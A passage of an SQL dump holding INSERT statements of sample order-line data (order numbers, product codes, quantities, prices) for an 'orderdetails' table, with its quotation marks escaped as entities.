(\u0026#39;10153\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;82.69\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;82.50\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;111.83\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;53.31\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;58.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;80.55\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;87.15\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;85.41\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10153\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;51.87\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10154\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;75.23\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10154\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;59.27\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;129.20\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;138.77\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;83.44\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;105.87\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;62.34\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;56.55\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;76.31\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;58.69\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;89.61\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;87.75\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;76.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;70.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10155\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;49.16\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10156\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;43.64\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10156\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;77.64\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;69.27\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;89.72\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;66.65\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;83.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;56.41\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10157\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;109.16\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10158\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;67.79\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;81.35\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;101.10\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;170.42\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;188.73\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;131.04\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;67.03\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;51.48\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;66.74\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;129.35\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;54.71\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;142.85\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;100.30\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;67.18\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;49.60\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;80.84\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;39.43\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;86.74\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10159\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;78.11\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;96.30\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;93.28\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;70.84\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;140.55\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;30.59\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10160\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;130.60\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;121.72\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;102.04\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;139.41\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;125.40\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;132.80\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;62.72\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;73.49\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;47.29\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;82.69\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;108.04\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;72.77\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10161\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;94.23\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;87.33\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;45.28\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;141.10\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;53.28\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;113.15\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;156.94\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;86.51\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;27.55\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;38.98\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10162\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;32.82\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;212.16\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;101.31\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;59.96\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;101.58\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;80.36\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10163\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;96.42\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;143.31\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;121.64\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;103.84\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;107.76\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;46.29\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;91.49\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;57.53\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10164\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;86.99\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;168.32\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;123.89\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;152.26\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;109.02\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;134.26\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;120.28\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;60.77\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;154.10\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;84.71\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;123.51\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;46.82\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;117.57\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;31.12\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;106.45\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;50.86\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;55.30\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;106.49\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10165\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;49.21\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10166\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;136.59\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10166\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;72.85\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10166\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;76.22\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;123.76\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;141.92\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;69.68\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;84.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;110.60\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;54.81\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;77.00\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;64.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;73.80\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;66.00\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;87.80\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;62.16\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;85.14\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;83.42\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;42.71\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10167\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;43.68\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;94.74\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;97.53\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;160.74\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;75.19\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;49.06\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;103.68\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;93.01\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;72.36\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;57.32\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;68.10\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;89.90\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10168\u0026#39;, \u0026#39;S32_4289\u0026#39;, 